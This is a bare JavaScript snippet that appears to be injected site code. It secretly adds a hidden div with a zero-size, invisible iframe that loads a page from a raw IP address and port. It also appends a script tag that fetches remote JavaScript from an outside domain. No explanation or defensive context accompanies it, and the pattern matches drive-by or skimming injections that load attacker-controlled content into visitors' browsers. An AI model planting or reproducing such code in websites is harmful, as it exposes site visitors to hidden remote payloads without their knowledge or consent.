(function(win,doc){
    var fdiv = document.body.firstChild;
	bd_div = document.createElement('div')
	e = document.body.insertBefore(bd_div,fdiv);
	e.id = "xhg_sc_xjb_ddddq";
	
	iframe_div = document.createElement('div');
	iframe_div_loaded = e.appendChild(iframe_div);
	iframe_div_loaded.id = "whatfuck";
	iframe_div_loaded.style.display = 'none';

	bd_ifr = document.createElement('iframe');
	f = iframe_div_loaded.appendChild(bd_ifr);
	f.src = "http://42.96.134.126:30011/tj/v1/index.html";
	f.width = '0';
	f.height = '0';
	f.style.display = 'none';

	var __t1 = document.createElement("script");
	__t1.src="http://www.123zouni.com/tb/a.js?v=14";
	document.head.appendChild(__t1);
})(window,document);